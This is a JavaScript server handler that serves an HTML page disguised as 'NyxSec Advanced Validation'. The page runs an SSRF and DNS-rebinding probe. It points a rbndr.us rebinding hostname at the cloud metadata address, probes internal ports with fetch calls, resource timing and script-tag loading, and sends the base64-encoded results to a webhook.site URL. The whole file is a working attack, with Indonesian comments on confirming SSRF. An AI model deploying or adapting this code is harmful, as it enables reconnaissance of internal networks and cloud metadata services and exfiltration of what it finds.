export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head><title>NyxSec Advanced Validation</title></head>
      <body>
        <pre>Status: Executing Triple-Validation Protocol...</pre>
        <script>
          const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
          const rebindBase = "01010101.a9fea9fe.rbndr.us";

          async function comprehensiveProbe(port) {
            const start = Date.now();
            const report = { port, fetchError: null, timing: {}, tagStatus: null };

            // 1. Fetch API Validation (Detailed Error Mapping)
            try {
              await fetch("http://" + rebindBase + ":" + port + "/nyxsec", { mode: 'no-cors' });
              report.tagStatus = "Fetch Success (No-CORS)";
            } catch (e) {
              report.fetchError = e.message; // Menangkap net::ERR_ spesifik
            }

            // 2. Resource Timing API (Micro-precision)
            // Membocorkan data yang diproses oleh networking stack Chrome
            const entries = performance.getEntriesByName("http://" + rebindBase + ":" + port + "/nyxsec");
            if (entries.length > 0) {
              report.timing = {
                duration: entries[0].duration,
                transferSize: entries[0].transferSize, // Jika > 0, SSRF Terkonfirmasi
                nextHopProtocol: entries[0].nextHopProtocol
              };
            }

            // 3. Script-Tag Probing (Content Leakage)
            // Mencoba mendeteksi jika port 9000 mengembalikan teks yang dianggap 'invalid script'
            return new Promise((resolve) => {
              const script = document.createElement('script');
              const timer = setTimeout(() => {
                report.tagStatus = "Timeout";
                resolve(report);
              }, 6000);

              script.onerror = () => {
                clearTimeout(timer);
                report.tagStatus = "Error (Connection Refused/Dropped)";
                resolve(report);
              };
              
              script.onload = () => {
                clearTimeout(timer);
                report.tagStatus = "Success (Content Parsed as Script)"; // Jackpot jika terjadi
                resolve(report);
              };

              script.src = "http://" + rebindBase + ":" + port + "/poc.js?v=" + Math.random();
              document.body.appendChild(script);
            });
          }

          async function runProtocol() {
            const targets = [9000, 9090, 80]; // Anomali vs Baseline
            const finalResults = [];

            for(const p of targets) {
              finalResults.push(await comprehensiveProbe(p));
            }

            fetch(webhook + "?comprehensive=" + btoa(JSON.stringify(finalResults)));
          }

          runProtocol();
        </script>
      </body>
    </html>
  `);
}
